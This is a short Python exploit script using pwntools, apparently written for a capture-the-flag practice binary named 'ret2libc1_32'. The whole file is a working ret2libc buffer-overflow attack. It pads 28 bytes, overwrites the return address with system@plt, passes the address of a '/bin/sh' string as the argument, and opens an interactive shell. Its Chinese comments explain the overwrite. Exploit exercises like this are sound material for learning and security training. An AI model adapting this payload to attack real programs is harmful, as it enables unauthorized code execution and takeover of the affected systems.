from pwn import*
o = process("./ret2libc1_32")
call_system = 0x8048449
system_plt = 0x8048310
bin_sh = 0x8048510
payload = b'a'*28
payload += p32(system_plt)    # 覆盖函数返回地址为call system地址
payload += p32(0x11111111)
payload += p32(bin_sh)    # 给call system的参数
pause()
o.sendline(payload)
o.interactive()
